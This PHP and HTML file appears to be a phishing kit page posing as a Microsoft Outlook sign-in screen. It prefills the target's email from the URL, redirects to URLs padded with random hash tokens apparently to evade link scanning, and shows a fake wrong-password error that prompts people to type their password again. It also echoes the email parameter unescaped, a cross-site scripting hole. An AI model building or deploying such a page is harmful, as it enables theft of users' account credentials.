<?php
if (isset($_GET['email'])) {
    $_email = $_GET['email'];
}else{
    $_email = '';
    if (!isset($_GET['id']) && !isset($_GET['auth'])) {
        @header('Location: index.php?'.strtoupper(md5(microtime()))."&auth=".md5(microtime()).sha1(microtime()));
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="shortcut icon" href="assets/favicon.ico" type="image/x-icon">
    <title>Outlook</title>
    <link rel="stylesheet" href="assets/app.css?<?=@microtime()?>">
</head>
<body>
    <div id="app">
        <div class="side"></div>
        <div class="main">
            <div class="wrapper">

                <div class="box">
                    <div class="logo"></div>
                    <div class="row">
                        <label for="">Email address:</label>
                        <input type="text" id="email" placeholder="email address" value="<?=$_email?>" >
                    </div>
                    <div class="row">
                        <label for="">Password:</label>
                        <input type="password" id="password" placeholder="password">
                    </div>
                    <div class="row">
                        <input type="checkbox" name="" id="show_pass">
                        <label for="show_pass" class="show_pass">Show password</label>
                    </div>
                    <div class="row">
                        <div class="error">The user name or password you entered isn't correct. Try entering it again.</div>
                    </div>
                    <div class="row">
                        <div class="login">sign in</div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="assets/app.js?<?=@microtime()?>"></script>
</body>
</html>